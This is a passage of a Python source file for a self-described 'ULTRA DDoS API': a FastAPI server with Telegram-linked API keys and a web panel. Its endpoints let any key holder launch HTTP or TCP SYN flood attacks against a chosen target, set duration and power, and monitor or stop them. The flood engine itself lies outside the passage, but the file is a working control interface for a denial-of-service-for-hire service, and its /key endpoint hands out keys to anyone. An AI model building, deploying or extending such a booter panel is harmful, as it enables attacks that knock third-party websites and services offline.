                json.dump(self.user_stats, f, indent=2)
        except:
            pass
    
    def _generate_admin_key(self):
        """Generate admin API key"""
        admin_key = "ULTRA_ADMIN_" + secrets.token_hex(24)
        
        self.api_keys[admin_key] = {
            "owner_id": 7612860268,
            "owner_name": "ULTRA_ADMIN",
            "created": datetime.now().isoformat(),
            "expires": None,
            "limit": 1000000000,
            "used": 0,
            "attacks": 0,
            "active": True,
            "admin": True
        }
        
        self._save_data()
        logger.info(f"🔑 ULTRA ADMIN KEY: {admin_key}")
    
    def validate_key(self, api_key: str) -> Optional[Dict]:
        """Validate API key"""
        if api_key in self.api_keys:
            data = self.api_keys[api_key]
            
            if not data.get("active", True):
                return None
            
            expires = data.get("expires")
            if expires:
                try:
                    if datetime.now() > datetime.fromisoformat(expires):
                        return None
                except:
                    pass
            
            if data.get("used", 0) >= data.get("limit", 1000):
                return None
            
            # Update usage
            data["used"] = data.get("used", 0) + 1
            
            # Update user stats
            user_id = data.get("owner_id")
            if user_id:
                uid = str(user_id)
                if uid not in self.user_stats:
                    self.user_stats[uid] = {"requests": 0, "attacks": 0}
                self.user_stats[uid]["requests"] += 1
            
            self._save_data()
            return data
        
        return None

# ==================== FASTAPI SERVER ====================
# Initialize
attack_engine = UltraAttackEngine()
telegram_bot = TelegramBot()

# FastAPI app
app = FastAPI(
    title="🔥 ULTRA DDoS API - WORLD'S MOST POWERFUL",
    description="50 MILLION+ RPS REAL ATTACKS",
    version="ULTRA_1.0"
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# API Key
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=False)

async def verify_key(api_key: str = Security(api_key_header)):
    if not api_key:
        raise HTTPException(status_code=401, detail="API key required")
    
    key_data = telegram_bot.validate_key(api_key)
    if not key_data:
        raise HTTPException(status_code=403, detail="Invalid API key")
    
    return key_data

# ==================== API ENDPOINTS ====================
@app.get("/")
async def root():
    """API Information"""
    return {
        "api": "🔥 ULTRA DDoS API",
        "version": "ULTRA_1.0",
        "status": "OPERATIONAL",
        "admin": "7612860268",
        "max_rps": "50,000,000+",
        "endpoints": {
            "/": "This info",
            "/start": "Start attack",
            "/status": "Check attack",
            "/stop": "Stop attack",
            "/stats": "Get stats",
            "/health": "Health check",
            "/key": "Generate key"
        },
        "note": "Add ?api_key=YOUR_KEY to all requests"
    }

@app.get("/start")
async def start_attack(
    request: Request,
    key_data: Dict = Depends(verify_key)
):
    """Start ULTRA attack - GET"""
    
    target = request.query_params.get("target", "")
    duration = int(request.query_params.get("duration", "60"))
    power = int(request.query_params.get("power", "1000"))
    attack_type = request.query_params.get("type", "http")
    
    if not target:
        return {
            "error": "Target required",
            "example": "/start?target=example.com&duration=60&power=10000&type=http&api_key=YOUR_KEY"
        }
    
    if duration > CONFIG["MAX_DURATION"]:
        return {"error": f"Max duration: {CONFIG['MAX_DURATION']}s"}
    
    if power > CONFIG["MAX_POWER"]:
        return {"error": f"Max power: {CONFIG['MAX_POWER']}"}
    
    # Start attack
    if attack_type == "syn":
        attack_id = attack_engine.start_tcp_syn_flood(target, duration, power)
    else:
        attack_id = attack_engine.start_ultra_attack(target, duration, power, attack_type)
    
    # Update key stats
    key_data["attacks"] = key_data.get("attacks", 0) + 1
    
    logger.info(f"🚀 Attack started by {key_data.get('owner_name')}: {attack_id}")
    
    return {
        "status": "ULTRA_ATTACK_STARTED",
        "attack_id": attack_id,
        "target": target,
        "duration": duration,
        "power": power,
        "type": attack_type,
        "estimated_rps": f"{power * 1000:,}+",
        "start_time": datetime.now().isoformat(),
        "monitor": f"/status?attack_id={attack_id}&api_key={request.query_params.get('api_key')}",
        "stop": f"/stop?attack_id={attack_id}&api_key={request.query_params.get('api_key')}"
    }

@app.get("/status")
async def get_status(
    request: Request,
    key_data: Dict = Depends(verify_key)
):
    """Get attack status - GET"""
    
    attack_id = request.query_params.get("attack_id", "")
    
    if not attack_id:
        return {"error": "attack_id required"}
    
    status = attack_engine.get_attack_status(attack_id)
    
    if not status:
        return {"error": "Attack not found"}
    
    return status

@app.get("/stop")
async def stop_attack(
    request: Request,
    key_data: Dict = Depends(verify_key)
):
    """Stop attack - GET"""
    
    attack_id = request.query_params.get("attack_id", "")
    
    if not attack_id:
        return {"error": "attack_id required"}
    
    if attack_engine.stop_attack(attack_id):
        return {
            "status": "ATTACK_STOPPED",
            "attack_id": attack_id,
            "message": "Attack stopped successfully",
            "timestamp": datetime.now().isoformat()
        }
    else:
        return {"error": "Attack not found or already stopped"}

@app.get("/stats")
async def get_stats(
    request: Request,
    key_data: Dict = Depends(verify_key)
):
    """Get statistics - GET"""
    
    cpu = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    net = psutil.net_io_counters()
    
    return {
        "system": {
            "cpu_percent": cpu,
            "memory_percent": memory.percent,
            "memory_gb": memory.used / (1024**3),
            "disk_percent": disk.percent,
            "network_sent_gb": net.bytes_sent / (1024**3),
            "network_recv_gb": net.bytes_recv / (1024**3),
            "uptime_seconds": time.time() - psutil.boot_time()
        },
        "attacks": {
            "active": attack_engine.global_stats["active_attacks"],
            "total_requests": attack_engine.global_stats["total_requests"],
            "total_bytes": attack_engine.global_stats["total_bytes"],
            "peak_rps": attack_engine.global_stats["peak_rps"],
            "success_rate": f"{attack_engine.global_stats['success_rate']*100:.1f}%",
            "total_packets": attack_engine.global_stats["total_packets"],
            "max_concurrent": attack_engine.global_stats["max_concurrent"]
        },
        "api": {
            "total_keys": len(telegram_bot.api_keys),
            "your_requests": key_data.get("used", 0),
            "your_attacks": key_data.get("attacks", 0),
            "your_limit": key_data.get("limit", 0)
        },
        "performance": {
            "max_rps": f"{CONFIG['MAX_RPS']:,}",
            "max_power": CONFIG["MAX_POWER"],
            "max_duration": CONFIG["MAX_DURATION"]
        },
        "timestamp": datetime.now().isoformat()
    }

@app.get("/health")
async def health_check():
    """Health check - GET"""
    return {
        "status": "ULTRA_HEALTHY",
        "timestamp": datetime.now().isoformat(),
        "engine": "running",
        "bot": "active",
        "attacks_running": attack_engine.global_stats["active_attacks"]
    }

@app.get("/key")
async def generate_key():
    """Generate API key - GET"""
    
    # Check if user is admin
    is_admin = False  # Default
    
    # Generate key
    if is_admin:
        key = "ADMIN_" + secrets.token_hex(24)
        limit = 1000000000
        expires = None
    else:
        key = "USER_" + secrets.token_hex(24)
        limit = 100000
        expires = (datetime.now() + timedelta(days=7)).isoformat()
    
    telegram_bot.api_keys[key] = {
        "owner_id": 0,
        "owner_name": "Auto_Generated",
        "created": datetime.now().isoformat(),
        "expires": expires,
        "limit": limit,
        "used": 0,
        "attacks": 0,
        "active": True,
        "admin": is_admin
    }
    
    telegram_bot._save_data()
    
    return {
        "key": key,
        "limit": limit,
        "expires": expires or "Never",
        "note": "Add ?api_key=KEY to all requests"
    }

@app.get("/admin")
async def admin_panel(request: Request):
    """Admin panel - GET"""
    api_key = request.query_params.get("api_key", "")
    
    key_data = telegram_bot.validate_key(api_key)
    if not key_data or not key_data.get("admin", False):
        return {"error": "Admin access required"}
    
    # Admin actions
    action = request.query_params.get("action", "")
    
    if action == "list_keys":
        return {"keys": list(telegram_bot.api_keys.keys())}
    elif action == "stats":
        return {
            "total_keys": len(telegram_bot.api_keys),
            "total_users": len(telegram_bot.user_stats),
            "total_requests": sum(v.get("requests", 0) for v in telegram_bot.user_stats.values())
        }
    elif action == "engine_stats":
        return attack_engine.global_stats
    
    return {
        "admin": "7612860268",
        "actions": [
            "/admin?action=list_keys&api_key=YOUR_KEY",
            "/admin?action=stats&api_key=YOUR_KEY",
            "/admin?action=engine_stats&api_key=YOUR_KEY"
        ]
    }

# ==================== WEB UI ====================
@app.get("/ui")
async def web_interface():
    """Web UI"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>🔥 ULTRA DDoS API</title>
        <style>
            body {
                background: #000;
                color: #fff;
                font-family: Arial, sans-serif;
                max-width: 1000px;
                margin: 0 auto;
                padding: 20px;
            }
            .container {
                background: #111;
                padding: 20px;
                border-radius: 10px;
                border: 2px solid #f00;
            }
            h1 {
                color: #f00;
                text-align: center;
            }
            .endpoint {
                background: #222;
                padding: 15px;
                margin: 10px 0;
                border-radius: 5px;
                border-left: 4px solid #0f0;
            }
            code {
                background: #333;
                padding: 2px 5px;
                border-radius: 3px;
                color: #0ff;
            }
            .form-group {
                margin: 15px 0;
            }
            input {
                width: 100%;
                padding: 10px;
                background: #222;
                border: 1px solid #f00;
                color: #fff;
                border-radius: 5px;
                margin: 5px 0;
            }
            button {
                background: #f00;
                color: #fff;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
                margin: 5px;
            }
            .result {
                background: #222;
                padding: 15px;
                margin: 20px 0;
                border-radius: 5px;
                white-space: pre-wrap;
                font-family: monospace;
                max-height: 400px;
                overflow-y: auto;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔥 ULTRA DDoS API - 50M+ RPS</h1>
            
            <div class="endpoint">
                <strong>Start Attack:</strong><br>
                <code>GET /start?target=example.com&duration=60&power=10000&api_key=YOUR_KEY</code>
            </div>
            
            <div class="endpoint">
                <strong>Check Status:</strong><br>
                <code>GET /status?attack_id=YOUR_ID&api_key=YOUR_KEY</code>
            </div>
            
            <div class="endpoint">
                <strong>Stop Attack:</strong><br>
                <code>GET /stop?attack_id=YOUR_ID&api_key=YOUR_KEY</code>
            </div>
            
            <div class="endpoint">
                <strong>Get Stats:</strong><br>
                <code>GET /stats?api_key=YOUR_KEY</code>
            </div>
            
            <div class="endpoint">
                <strong>Get Key:</strong><br>
                <code>GET /key</code>
            </div>
            
            <div class="form-group">
                <h3>Quick Attack</h3>
                <input type="text" id="api_key" placeholder="API Key">
                <input type="text" id="target" placeholder="Target (example.com)">
                <input type="number" id="duration" placeholder="Duration (60)" value="60">
                <input type="number" id="power" placeholder="Power (10000)" value="10000">
                
                <button onclick="startAttack()">🚀 Start Attack</button>
                <button onclick="getStats()">📊 Get Stats</button>
                <button onclick="getKey()">🔑 Get Key</button>
            </div>
            
            <div id="result" class="result"></div>
        </div>
        
        <script>
            function startAttack() {
                const key = document.getElementById('api_key').value;
                const target = document.getElementById('target').value;
                const duration = document.getElementById('duration').value;
                const power = document.getElementById('power').value;
                
                if (!target) {
                    showResult('Error: Target required');
                    return;
                }
                
                const url = `/start?target=${encodeURIComponent(target)}&duration=${duration}&power=${power}&api_key=${key}`;
                
                fetch(url)
                    .then(r => r.json())
                    .then(data => {
                        showResult(JSON.stringify(data, null, 2));
                    })
                    .catch(e => {
                        showResult('Error: ' + e.message);
                    });
            }
            
            function getStats() {
                const key = document.getElementById('api_key').value;
                const url = `/stats?api_key=${key}`;
                
                fetch(url)
                    .then(r => r.json())
                    .then(data => {
                        showResult(JSON.stringify(data, null, 2));
                    })
                    .catch(e => {
                        showResult('Error: ' + e.message);
                    });
            }
            
            function getKey() {
                fetch('/key')
                    .then(r => r.json())
                    .then(data => {
                        showResult(JSON.stringify(data, null, 2));
                    })
                    .catch(e => {
                        showResult('Error: ' + e.message);
                    });
            }
            
            function showResult(text) {
                document.getElementById('result').textContent = text;
            }
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html)

# ==================== MAIN ====================
async def main():
    """Main function"""
    print("🔥" * 70)
    print("🔥 ULTRA DDoS API - WORLD'S MOST POWERFUL")
    print("🔥 50 MILLION+ RPS REAL ATTACKS")
    print("🔥 TELEGRAM BOT: @YOUR_BOT")
    print("🔥 ADMIN ID: 7612860268")
    print("🔥" * 70)
    print(f"📡 Server: http://0.0.0.0:{CONFIG['API_PORT']}")
    print(f"⚡ Max RPS: {CONFIG['MAX_RPS']:,}")
    print(f"💀 Max Power: {CONFIG['MAX_POWER']}")
    print(f"⏱️ Max Duration: {CONFIG['MAX_DURATION']}s")
    print("=" * 70)
    
    # Start server
    uvicorn.run(
        app,
        host=CONFIG["BIND_HOST"],
        port=CONFIG["API_PORT"],
        log_level="info",
        access_log=False
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🔥 ULTRA API stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()